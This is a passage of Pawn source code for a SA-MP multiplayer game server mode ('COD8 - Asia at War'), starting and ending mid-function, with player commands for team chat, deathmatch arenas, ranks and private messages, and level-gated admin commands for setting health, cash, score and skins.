		   format(string,sizeof(string),"Administrator %s has given %d cash to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(blue, string);
	   }
	   //-------India---------
	   if(strfind(params,"India",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_INDIA)
			   {
				   GivePlayerMoney(i, amount);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d cash to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(blue, string);
	   }
	   //----------CHINA-------
	   if(strfind(params,"China",true) != -1 || strfind(params,"China",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_CHINA)
			   {
				   GivePlayerMoney(i, amount);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d cash to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(blue, string);
	   }
	   //-----------Nepal---------
	   if(strfind(params,"Nepal",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_NEPAL)
			   {
				   GivePlayerMoney(i, amount);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d cash to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(blue, string);
	   }
    //-----------Malaysia---------
	   if(strfind(params,"Malaysia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   for(new i = 0; i < MAX_PLAYERS; i++)
		   {
			   if(gTeam[i] == TEAM_ML)
			   {
				   GivePlayerMoney(i, amount);
			   }
		   }
		   new string[100];
		   format(string,sizeof(string),"Administrator %s has given %d cash to team %s",PlayerName2(playerid),amount,team);
		   SendClientMessageToAll(blue, string);
	   }
	}
	else return SendClientMessage(playerid, RED,"[ERROR]: You are not high enough level to use this command!");
	return 1;
}
CMD:ranks(playerid, params[])
{
ShowPlayerDialog(playerid, 12516, DIALOG_STYLE_MSGBOX,"Ranks","Rank 1 Corporal (0 Scores)\nRank 2 Lieutenant (100 Scores)\nRank 3 Major (300 Scoores)\nRank 4 Captain (500 Scores)\nRank 5 Commander (1000 Scores)\nRank 6 General (1500 Scores)\nRank 7 Brigadier (2000 Scores)\nRank 8 Field Marshall (2500 Scores)\nRank 9 Master of Wars (5000 Scores)\nRank 10 General of Army (10000 Scores)","Okay","");
return 1;
}

CMD:r(playerid,params[]) {
#pragma unused params
if(isnull(params)) return SendClientMessage(playerid, -1, "USAGE: /r [text] to talk in team radio");
new Name[MAX_PLAYER_NAME]; GetPlayerName(playerid, Name, sizeof(Name));
new string[128];
format(string, sizeof(string), "[R][TEAM RADIO] %s: %s", Name, params[0]);
printf("%s", string);

for(new i = 0; i < MAX_PLAYERS; i++)
{
if(IsPlayerConnected(i) && gTeam[i] == gTeam[playerid]) SendClientMessage(i, green, string);
}
return 1;
}

CMD:order(playerid,params[]) {
#pragma unused params
if(isnull(params)) return SendClientMessage(playerid, -1, "USAGE: /order [text]");
new Name[MAX_PLAYER_NAME]; GetPlayerName(playerid, Name, sizeof(Name));
new string[128];
format(string, sizeof(string), "*%s %s: %s",GetRankName(playerid), Name, params[0]);
printf("%s", string);

for(new i = 0; i < MAX_PLAYERS; i++)
{
if(IsPlayerConnected(i) && gTeam[i] == gTeam[playerid]) SendClientMessage(i, lightblue, string);
}
return 1;
}


CMD:myrank(playerid, params[])
{
	new string[200];
	format(string, sizeof(string),"{FFFFFF}Your current rank status is {FFFFFF}| Scores: "cgreen"%d {FFFFFF}| Rank: "cgreen"%s", GetPlayerScore(playerid), GetRankName(playerid));
	SendClientMessage(playerid, green, string);
	return 1;
}
CMD:shipattack(playerid, params[])
{
if(ShipAttack[playerid] == 0)
				   {
						SetPlayerTeam(playerid, -1);
	        	        SetPlayerSkin(playerid, 281);
	        	        SetPlayerHealth(playerid, 100);
	        	        SetPlayerArmour(playerid, 100);
	        	        SetPlayerColor(playerid, 0x80FF8096);
	        	        SetPlayerPos(playerid, -1448.057,1471.412,-1354.634);
	        	        SetPlayerInterior(playerid, 0);
						ResetPlayerWeapons(playerid);
						GivePlayerWeapon(playerid, 24, 999999);
						GivePlayerWeapon(playerid, 27, 999999);
						GivePlayerWeapon(playerid, 31, 999999);
						new name[MAX_PLAYER_NAME];
						GetPlayerName(playerid, name, sizeof(name));
						new string[128];
						AntiSK[playerid] = 1;
						format(string, sizeof(string), "%s has joined ShipAttack (/shipattack)!", name);
	    				SendClientMessageToAll(green, string);
	    				SendClientMessage(playerid,red -1, "/leavesa to leave ShipAttack!");
	    			}
	    			else return SendClientMessage(playerid, RED,"You cannot join ShipAttack! Try again later");

return 1;
}
CMD:minigundm(playerid, params[])
{
if(AntiSK[playerid] == 0)
				   {
						SetPlayerTeam(playerid, -1);
	        	        SetPlayerSkin(playerid, 240);
	        	        SetPlayerHealth(playerid, 100);
	        	        SetPlayerArmour(playerid, 100);
	        	        SetPlayerColor(playerid, 0xFFFFFFFF);
	        	        new rand = random(sizeof(MiniSpawn));
	                    SetPlayerPos(playerid, MiniSpawn[rand][0], MiniSpawn[rand][1], MiniSpawn[rand][2]);
	        	        SetPlayerInterior(playerid, 0);
						ResetPlayerWeapons(playerid);
						GivePlayerWeapon(playerid, 38, 999999);
						new name[MAX_PLAYER_NAME];
						GetPlayerName(playerid, name, sizeof(name));
						new string[128];
						format(string, sizeof(string), "{0087FF}%s {FFFFFF}has joined {0087FF}Minigun DeathMatch!{FFFFFF}(/minigundm)", name);
	    				SendClientMessageToAll(-1, string);
	    				SendClientMessage(playerid, red, "/exitdm to leave minigun dm!");
	    			}
	    			else return SendClientMessage(playerid, red,"You cannot join Minigun-DM while in AntiSK protection! Try again later");
return 1;
}
CMD:cbdm(playerid, params[])
{
if(AntiSK[playerid] == 0)
				   {
						SetPlayerTeam(playerid, -1);
	        	        SetPlayerSkin(playerid, 230);
	        	        SetPlayerHealth(playerid, 100);
	        	        SetPlayerArmour(playerid, 100);
	        	        SetPlayerColor(playerid, 0xFFFFFFFF);
	        	        new rand = random(sizeof(CBSpawn));
	                    SetPlayerPos(playerid, CBSpawn[rand][0], CBSpawn[rand][1], CBSpawn[rand][2]);
	        	        SetPlayerInterior(playerid, 10);
						ResetPlayerWeapons(playerid);
						GivePlayerWeapon(playerid, 24, 999999);
						new name[MAX_PLAYER_NAME];
						GetPlayerName(playerid, name, sizeof(name));
						new string[128];
						format(string, sizeof(string), "{0087FF}%s {FFFFFF}has joined {0087FF}Cbug DeathMatch!{FFFFFF}(/cbdm)", name);
	    				SendClientMessageToAll(-1, string);
	    				SendClientMessage(playerid, red, "/exitdm to leave cbug dm!");
	    			}
	    			else return SendClientMessage(playerid, red,"You cannot join Cbug-DM while in AntiSK protection! Try again later");

return 1;
}
CMD:sdm(playerid, params[])
{
if(AntiSK[playerid] == 0)
				   {
						SetPlayerTeam(playerid, -1);
	        	        SetPlayerSkin(playerid, 230);
	        	        SetPlayerHealth(playerid, 100);
	        	        SetPlayerArmour(playerid, 100);
	        	        SetPlayerColor(playerid, 0xFFFFFFFF);
	        	        new rand = random(sizeof(SDMSpawn));
	                    SetPlayerPos(playerid, SDMSpawn[rand][0], SDMSpawn[rand][1], SDMSpawn[rand][2]);
	        	        SetPlayerInterior(playerid, 0);
	        	        ResetPlayerWeapons(playerid);
						GivePlayerWeapon(playerid, 34, 999999);
						new name[MAX_PLAYER_NAME];
						GetPlayerName(playerid, name, sizeof(name));
						new string[128];
						format(string, sizeof(string), "{0087FF}%s {FFFFFF} joined {0087FF}Sniper DeathMatch!{FFFFFF}(/sdm)", name);
	    				SendClientMessageToAll(-1, string);
	    				SendClientMessage(playerid, red, "/exitdm to leave sniper dm!");
	    			}
	    			else return SendClientMessage(playerid, red,"You cannot join Sniper-DM while in AntiSK protection! Try again later");

return 1;
}
CMD:exitdm(playerid, params[])
{
SpawnPlayer(playerid);
SendClientMessage(playerid, 0x33FF33AA, "You Left DM!");
return true;
}
CMD:leaveba(playerid, params[])
{
SpawnPlayer(playerid);
SendClientMessage(playerid, 0x33FF33AA, "You Left Battle Attack!");
return true;
}
CMD:leavema(playerid, params[])
{
SpawnPlayer(playerid);
SendClientMessage(playerid, 0x33FF33AA, "You Left Motel Attack!");
return true;
}
CMD:leavesa(playerid, params[])
{
SpawnPlayer(playerid);
SendClientMessage(playerid, 0x33FF33AA, "You Left Ship Attack!");
return true;
}
CMD:acl(playerid, params[])
{
if(PlayerInfo[playerid][Level] >= 1)
				   {
				   CMDMessageToAdmins(playerid,"Admin Chill Lounge");
	        	        SetPlayerHealth(playerid, 100);
	        	        SetPlayerArmour(playerid, 100);
	        	        SetPlayerColor(playerid, 0xA52A2AAA);
	        	        SetPlayerPos(playerid, -673.7068, 396.9838, 2.6863);
	    			return GameTextForPlayer(playerid,"Welcome Admin",1000,3);
	               }
	else
	{
	   	SetPlayerHealth(playerid,1.0);
   		new string[100]; format(string, sizeof(string),"%s has used acl (non admin)", PlayerName2(playerid) );
	   	MessageToAdmins(red,string);
	} return SendClientMessage(playerid,red, "ERROR: You must be an administrator to use this command.");
}

CMD:sync(playerid, params[])
{
new Float:X, Float:Y, Float:Z;
GetPlayerPos(playerid, Float:X, Float:Y, Float:Z);
SetPlayerPos(playerid, Float:X, Float:Y, Float:Z);
SendClientMessage(playerid, GREEN,"You Have Synced");

return 1;
}

CMD:forum(playerid, params[])
{
SendClientMessage(playerid, RED, "Server Website : gaming-samp.tk");
GameTextForPlayer(playerid, "~w~Server Website:~r~gaming-samp.tk", 2500, 3);
return 1;
}

CMD:objective(playerid, params[])
{
ShowPlayerDialog(playerid, 17, DIALOG_STYLE_MSGBOX, "===| COD8:AaW Objectives|===", "{FF9E00}> Your Objective is to Kill Players\n{FF9E00} > Make killing spree \n{FF9E00}> Capture zones", "Close", "");
return 1;
}
CMD:help(playerid, params[])
{
    ShowPlayerDialog(playerid, 17, DIALOG_STYLE_MSGBOX, "===| COD8:AaW Help |===", "{FF9E00}Q1.How to Rank Up?\nA1.Killing Enemies and Capture the zones or making big kill streaks and get bonus!\n\n{FF9E00}Q2.What's Spawn Kill?\nA2.Killing Some one in his base with{Tank,Hunter,Hydra,Seasparrow)!\n\n{FF9E00}If you have any Question or need Help /pm any admin online or any moderator (/admins, /moderators)", "Close", "");
    return 1;
}
CMD:kill(playerid, params[])
{
SetPlayerHealth(playerid, 0.0);
SendClientMessage(playerid, -1, "You Have Killed Yourself!");
return true;
}

CMD:rules(playerid, params[])
{
    ShowPlayerDialog(playerid, 16, DIALOG_STYLE_MSGBOX, "Rules", "{FF9E00}1).Don't Use Any Kind Of Hacks/Cheats\n{FF9E00}2).Don't Insult/spam/flood/advertise\n{FF9E00}3).Respect All Players/Admins\n{FF9E00}4).Don't Park Your Car On Other Players\n{FF9E00}5).Don't Spawn Kill\n{FF9E00}6).Don't Ask For Score/Cash From Admins", "Close", "");
	return 1;
}
CMD:cmds(playerid, params[])
{
	new CommandList[2000] = "%s";
		new a;
		new Commands[][] =	{
		" \n%s",
        "{00FF40} Server Commands\n{DADADA}%s",
		"/report\t:    report a player\n%s",
		"/ranks\t:     To know all ranks\n%s",
		"/kill\t:      To suicide yourself\n%s",
		"/admins\t:    see all connected admins\n%s",
		"/donors\t:    see all online donors\n%s",
		"/pm\t:        To send private message\n%s",
		"/rpm\t:         To reply a pm\n%s",
		"/help\t:      For server help\n%s",
		"/Stats\t\t:  See your current stats\n%s",
		"/Changepass\t\n%s",
		"/duel\t: to duel with players\n%s",
		"/fps\t: for first person mode\n%s",
		"/nofps\t: to stop first person mode\n%s",
		"/order\t:      To order teammates\n%s",
		"/richlist\t:   To see the richest one online\n%s",
		"/st\t\t:     Change your team\n%s",
		"/sc\t\t:     Change your class\n%s",
		"/ep\t\t:     For emergency parachute",
		"/commands for more advance commands\n"
		};

		a = sizeof(Commands);
		for(new i = 0; i<a; i++)
		{
			format(CommandList, sizeof(CommandList), CommandList, Commands[i]);
		}

	    format(CommandList, sizeof(CommandList), CommandList, "");

  		ShowPlayerDialog(playerid,51, DIALOG_STYLE_MSGBOX, "{FFFF00}COD8 - Asia at Warfare", CommandList, "close", "");
		return 1;
	}
CMD:commands(playerid, params[])
{
	SendClientMessage(playerid, COLOR_ORANGE, "_________|- COD8 - Asia at War  Commands -|_________");
	SendClientMessage(playerid, COLOR_PURPLE, "/ranks | /myrank | /spree | /kill | /rules | /stats | /topscores | /richlist");
	SendClientMessage(playerid, COLOR_PURPLE, "/help | /pm | /r [text] | /ep | /anims | /laseron | /lasercol | /order [text] | /spree");
	SendClientMessage(playerid, COLOR_PURPLE, "/moderators | /admins | /cmds | /st | /sc | /kill | /objective | /teams | /minigundm");
	SendClientMessage(playerid, COLOR_PURPLE, "/cbdm | /sdm | /shipattack | /fps | /nofps ");
	SendClientMessage(playerid, COLOR_PURPLE, "/duel [id/name] [amount] | /accept | /decline ");
	return true;
}
CMD:sc(playerid, params[])
{
	GameTextForPlayer(playerid, "~g~Class Selection ~w~On Next Death", 3000, 3);
	SendClientMessage(playerid, -1, ""COL_GREEN"Server: "COL_WHITE"You can switch class instantly now by /kill.");
	FirstSpawn[playerid]=1;
	return 1;
}
CMD:gmx(playerid, params[])
{
        if(PlayerInfo[playerid][Level] >= 7) {
        SendClientMessage(playerid,-1,"Server has been successfully restarted.");
        return SendRconCommand("gmx");
        } else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}
CMD:st(playerid, params[])
{
    ForceClassSelection(playerid);
	GameTextForPlayer(playerid, "~g~Team Selection ~w~On Next Death", 3000, 3);
	SendClientMessage(playerid, -1, ""COL_GREEN"Server: "COL_WHITE"You can switch team instantly now by /kill Or Press F4 + /Kill.");
	FirstSpawn[playerid]=1;
	return 1;
}

CMD:groupcmds(playerid, params[])
{
	SendClientMessage(playerid, GREEN, "________________ Group Commands ________________");
	SendClientMessage(playerid, -1, "Under Maintenence.");
	SendClientMessage(playerid, GREEN, "________________________________________________");
	return 1;
}

CMD:credits(playerid, params[])
{
	ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX ,""cred"_________| Credits |_________","Jarnu (Main Script)\nxMx4LiFe(Scripter)\nRog(Editing)","Ok","");
	return 1;
}

CMD:ep(playerid, params[])
{
	GivePlayerWeapon(playerid, 46,1);
	SendClientMessage(playerid, -1, "You have got an emergency parachute !");
	return 1;
}

CMD:updates(playerid, params[])
{
    ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX ,""cred"____|Server Updates v1.1|____","- Added More Capture Zones\n- New Death Match Added\n- New Team Bases\n- Duel System\n- New Teams (Dubai & Malaysia)\n- First Person Mode\n- New Textdraws","Ok","");
	return 1;
}

CMD:anims(playerid, params[])
{
    SendClientMessage(playerid, -1,  "/relax | /scared | /sick | /wave | /spank | /taichi | /crossarms |\n");
	SendClientMessage(playerid, -1,  "/wank | /kiss | /talk | /fucku | /cocaine | /rocky | /sit | /smoke |\n");
	SendClientMessage(playerid, -1,  "/beach | /lookout | /circle | /medic | /chat | /die | /slapa | /rofl |\n");
	SendClientMessage(playerid, -1,  "/glitched | /fakefire | /bomb | /robman | /handsup | /piss |\n");
	SendClientMessage(playerid, -1,  "/getin | /skate | /cover | /fart | /vomit | /drunk |\n");
	SendClientMessage(playerid, -1,  "/funnywalk | /kickass | /cell | /laugh | /eat | /injured |\n");
	SendClientMessage(playerid, -1,  "/slapass | /laydown | /arrest | /laugh | /eat | /carjack ||");
	SendClientMessage(playerid, -1,  "To Stop an Anim Press Aim_KEY");
	return 1;
}

CMD:s(playerid,params[]) {
if(isnull(params)) return SendClientMessage(playerid, -1, "USAGE: /s [text] to talk to nearest person");
new Name[MAX_PLAYER_NAME]; GetPlayerName(playerid, Name, sizeof(Name));
new string[128], Float:x, Float:y, Float:z;
GetPlayerPos(playerid, x, y, z);
format(string, sizeof(string), ""COL_WHITE"[%s] says: %s", Name, params[0]);
new str[128];
format(str, sizeof(str),"[SAY] %s: %s", Name, params[0]);
printf("%s", string);
for(new i = 0; i < MAX_PLAYERS; i++)
{
if(IsPlayerConnected(i) && IsPlayerInRangeOfPoint(i,50.0, x, y, z) ) SendClientMessage(i, RED, string);
}
return 1;
}
forward HighLight(playerid);
public HighLight(playerid)
{
	if(!IsPlayerConnected(playerid)) return 1;
	if(PlayerInfo[playerid][blipS] == 0) { SetPlayerColor(playerid, 0xFF0000AA); PlayerInfo[playerid][blipS] = 1; }
	else { SetPlayerColor(playerid, 0x33FF33AA); PlayerInfo[playerid][blipS] = 0; }
	return 0;
}
public PMLog(string[])
{
    new pm[128]; // Creates a new string
    format(pm, sizeof(pm), "%s\n", string); // Formats the string;
    new File:hFile; // Creates a new variable with type File
    hFile = fopen("/LOGS/pm.log", io_append); // Opens the Log File
    fwrite(hFile, pm); // Writes the log
    fclose(hFile); // Closes file
}
//===================== [ ZCMD Commands ]=======================================
CMD:pm(playerid, params[])
{
   new str[128], str2[128], id, adminstr[128];
   if(sscanf(params,"ds[128]", id, str2)) return SendClientMessage(playerid, red,"USAGE: /pm [id] [message]");
   if(IsPlayerConnected(id))
   {
	   if(id != playerid)
	   {
		   if(DND[id] == 0)
		   {
		   		format(str, sizeof(str),"PM to [%d]%s: %s", id, PlayerName2(id), str2);
		   		SendClientMessage(playerid, yellow, str);
		   		format(str, sizeof(str),"PM from [%d]%s: %s", playerid, PlayerName2(playerid), str2);
		   		SendClientMessage(id, yellow, str);
		   		SendClientMessage(id, -1,"Use "cblue"/rpm [message] "cwhite"to reply to this PM");
		   		format(adminstr, sizeof(adminstr),"PM from %s[%d] to %s[%d]: %s", PlayerName2(playerid), playerid, PlayerName2(id), id, str2);
		   		MessageTo4(grey, adminstr);
		   		LastPm[id] = playerid;
		   }
		   else return SendClientMessage(playerid, red,"That player is in do not disturb mode!");
	   }
	   else return SendClientMessage(playerid, red,"You cannot PM yourself");
   }
   else return SendClientMessage(playerid, red,"Player is not connected");
   return 1;
}
CMD:rpm(playerid, params[])
{
   new str[128], str2[128], adminstr[128];
   if(sscanf(params,"s[128]", str2)) return SendClientMessage(playerid, red,"USAGE: /rpm [message]");
   new id = LastPm[playerid];
   if(IsPlayerConnected(id))
   {
	   if(DND[id] == 0)
	   {
            format(str, sizeof(str),"PM to [%d]%s: %s", id, PlayerName2(id), str2);
	   		SendClientMessage(playerid, yellow, str);
	   		format(str, sizeof(str),"PM from [%d]%s: %s", playerid, PlayerName2(playerid), str2);
	   		SendClientMessage(id, yellow, str);
	   		SendClientMessage(id, -1,"Use "cblue"/rpm [message] "cwhite"to reply to this PM");
	   		format(adminstr, sizeof(adminstr),"PM from %s[%d] to %s[%d]: %s", PlayerName2(playerid), playerid, PlayerName2(id), id, str2);
		   		MessageToAdmins(grey, adminstr);
	   		LastPm[LastPm[playerid]] = playerid;
	   }
	   else return SendClientMessage(playerid, red,"That player is in do not disturb mode!");
   }
   else return SendClientMessage(playerid, red,"Player is not connected");
   return 1;
}
CMD:dnd(playerid, params[])
{
   if(DND[playerid] == 0)
   {
	   DND[playerid] = 1;
	   SendClientMessage(playerid, green,"Do not disturb mode enabled!");
   }
   else if(DND[playerid] == 1)
   {
	   DND[playerid] = 0;
	   SendClientMessage(playerid, red,"Do not disturb mode disabled!");
   }
   return 1;
}
CMD:m(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Helper] == 1 || PlayerInfo[playerid][Level] >= 1) {
 		if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /m [text] To Talk in Moderator Chat");
		new string[128]; format(string, sizeof(string), "[Mod.Chat]: %s: %s", PlayerName2(playerid), params[0]);
		return MessageToTwice(0x8000FFC8,string);
	} else return SendClientMessage(playerid,red,"ERROR: You need to be Help Moderator to use this command");
}
CMD:helpme(playerid, params[])
{
	new str[128], Name1[MAX_PLAYER_NAME];
	if(sscanf(params,"s[128]", str))
	{
	 SendClientMessage(playerid, red,"CORRECT USAGE: /helpme [text]");
	 return 1;
	}
	GetPlayerName(playerid, Name1, sizeof(Name1));
	format(str, sizeof(str),"{00FFFF}[HELP MSG From %s]:{00FFF0} %s",Name1, str);
	MessageToTwice(red, str);
	SendClientMessage(playerid, yellow,"Your Request has been sent to online Administrators.");
	return 1;
}
CMD:giveweapon(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 2) {
	    new tmp[256], tmp2[256], tmp3[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index), tmp3 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "USAGE: /giveweapon [playerid] [weapon id/weapon name] [ammo]");
		new player1 = strval(tmp), weap, ammo, WeapName[32], string[128];
		if(!strlen(tmp3) || !IsNumeric(tmp3) || strval(tmp3) <= 0 || strval(tmp3) > 99999) ammo = 500; else ammo = strval(tmp3);
		if(!IsNumeric(tmp2)) weap = GetWeaponIDFromName(tmp2); else weap = strval(tmp2);
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
        	if(!IsValidWeapon(weap)) return SendClientMessage(playerid,red,"ERROR: Invalid weapon ID");
			CMDMessageToAdmins(playerid,"GIVEWEAPON");
			GetWeaponName(weap,WeapName,32);
			format(string, sizeof(string), "You have given \"%s\" a %s (%d) with %d rounds of ammo", PlayerName2(player1), WeapName, weap, ammo); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has given you a %s (%d) with %d rounds of ammo", PlayerName2(playerid), WeapName, weap, ammo); SendClientMessage(player1,blue,string); }
   			return GivePlayerWeapon(player1, weap, ammo);
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}
CMD:sethealth(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "USAGE: /sethealth [playerid] [amount]");
		if(strval(tmp2) < 0 || strval(tmp2) > 100 && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid, red, "ERROR: Invaild health amount");
		new player1 = strval(tmp), health = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SETHEALTH");
			format(string, sizeof(string), "You have set \"%s's\" health to '%d", pName(player1), health); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your health to '%d'", pName(playerid), health); SendClientMessage(player1,blue,string); }
   			return SetPlayerHealth(player1, health);
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:setarmour(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "USAGE: /setarmour [playerid] [amount]");
		if(strval(tmp2) < 0 || strval(tmp2) > 100 && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid, red, "ERROR: Invaild health amount");
		new player1 = strval(tmp), armour = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SETARMOUR");
			format(string, sizeof(string), "You have set \"%s's\" armour to '%d", pName(player1), armour); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your armour to '%d'", pName(playerid), armour); SendClientMessage(player1,blue,string); }
   			return SetPlayerArmour(player1, armour);
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:setcash(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "USAGE: /setcash [playerid] [amount]");
		new player1 = strval(tmp), cash = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SETCASH");
			format(string, sizeof(string), "You have set \"%s's\" cash to '$%d", pName(player1), cash); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your cash to '$%d'", pName(playerid), cash); SendClientMessage(player1,blue,string); }
			ResetPlayerMoney(player1);
   			return GivePlayerMoney(player1, cash);
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:setscore(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 5) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "USAGE: /setscore [playerid] [score]");
		new player1 = strval(tmp), score = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SETSCORE");
			format(string, sizeof(string), "You have set \"%s's\" score to '%d' ", pName(player1), score); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your score to '%d'", pName(playerid), score); SendClientMessage(player1,blue,string); }
   			return SetPlayerScore(player1, score);
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:setskin(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "USAGE: /setskin [playerid] [skin id]");
		new player1 = strval(tmp), skin = strval(tmp2), string[128];
		if(!IsValidSkin(skin)) return SendClientMessage(playerid, red, "ERROR: Invaild Skin ID");
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"SETSKIN");
			format(string, sizeof(string), "You have set \"%s's\" skin to '%d", pName(player1), skin); SendClientMessage(playerid,blue,string);
			if(player1 != playerid) { format(string,sizeof(string),"Administrator \"%s\" has set your skin to '%d'", pName(playerid), skin); SendClientMessage(player1,blue,string); }
   			return SetPlayerSkin(player1, skin);
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:setmoderator(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
	new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "USAGE: /setmoderator [playerid]");
		new player1 = strval(tmp),string[128], AdminN[24], Mname[24];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
		GetPlayerName(playerid, AdminN,sizeof( AdminN ));
		GetPlayerName(player1, Mname,sizeof( Mname ));
		new year,month,day;   getdate(year, month, day); new hour,minute,second; gettime(hour,minute,second);
        PlayerInfo[player1][Helper] = 1;
        format(string, sizeof(string), "Adminsitator %s Has Set You As Help moderator", AdminN);
        SendClientMessage(player1,yellow,string);
        format(string, sizeof(string), "You Have Set %s As Help moderator", Mname);
        SendClientMessage(playerid,yellow,string);
        format(string,sizeof(string),"Administrator %s has made %s Help Moderator on %d/%d/%d at %d:%d:%d",AdminN, Mname, day, month, year, hour, minute, second);
		SaveToFile("AdminLog",string);
		CMDMessageToAdmins(playerid,"SETMODERATOR");
        if(PlayerInfo[player1][Helper] == 0)
        {
		  GameTextForPlayer(player1,"~y~Promoted To Help moderator", 2000, 3);
		  PlayerInfo[player1][Helper] = 1;
	    }
        else if(PlayerInfo[player1][Level] == 0)
        {
